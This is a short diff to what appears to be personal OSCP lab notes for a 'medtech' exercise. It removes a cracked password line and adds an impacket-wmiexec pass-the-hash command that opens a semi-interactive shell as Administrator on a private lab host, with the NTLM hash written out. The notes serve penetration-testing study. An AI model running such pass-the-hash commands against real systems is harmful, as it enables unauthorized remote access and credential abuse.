@@ -126,4 +126,11 @@ cat web.config
 
 ```
 
-Cracked Joe's hash: `Flowers1`
+
+
+Semi-interactive shell:
+```
+┌─[root@edu-virtualbox]─[/home/edu/OSCP/medtech]
+└──╼ #impacket-wmiexec -hashes 00000000000000000000000000000000:b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.186.121
+
+```
